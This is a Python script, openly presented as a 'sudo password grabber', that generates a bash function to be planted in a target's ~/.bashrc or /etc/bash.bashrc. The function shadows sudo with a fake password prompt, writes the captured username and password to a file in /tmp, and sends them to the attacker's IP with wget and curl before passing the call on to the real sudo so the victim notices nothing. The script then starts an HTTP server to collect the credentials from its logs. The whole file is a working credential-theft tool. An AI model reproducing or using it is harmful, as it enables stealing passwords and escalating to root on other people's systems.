import os
print("This is the sudo password grabber")
print("This tool requires user-level access for the account you are trying to steal from")

ip = os.popen("hostname -I").read()
ip = str(ip).rstrip()

if os.path.exists("PWG5fQ.txt"):
    os.remove("PWG5fQ.txt")

f = open("PWG5fQ.txt", "x")
f.write('function sudo()\n{\nrealsudo="$(which sudo)";\n')
f.write('read -s -p "[sudo] password for $USER: " inputPasswd;\n')
f.write('printf "\\n";\n')

f.write('touch /tmp/config-err-PWG5fQ;\n')
f.write('printf "%s\\n" "$USER : $inputPasswd" > /tmp/config-err-PWG5fQ;\n')

f.write('wget "')
f.write(ip)
f.write('/$USER:$inputPasswd" > /dev/null 2>&1;\n')

f.write('curl -s "')
f.write(ip)
f.write('/$USER:$inputPasswd" > /dev/null 2>&1;\n')

f.write('$realsudo -S -u root bash -c "exit" <<< "$inputPasswd" > /dev/null 2>&1;\n')
f.write('$realsudo "${@:1}";\n')
f.write('}')
f.close()

print("Copy the contents of file: PWG5fQ.txt")
print("If you currently have root access, paste the contents into the /etc/bash.bashrc file")
print("If you only have user-level access, paste the contents into the ~/.bashrc file\n")

print("File will be saved on target machine to /tmp/config-err-PWG5fQ")
print("Password will be seen as a 404 error on the http server in the form \"GET /{USER}:{PASS} HTTP/1.1\" 404\n")
print("Now starting http server on this machine...\n\n")
os.system('sudo python3 -m http.server 80')
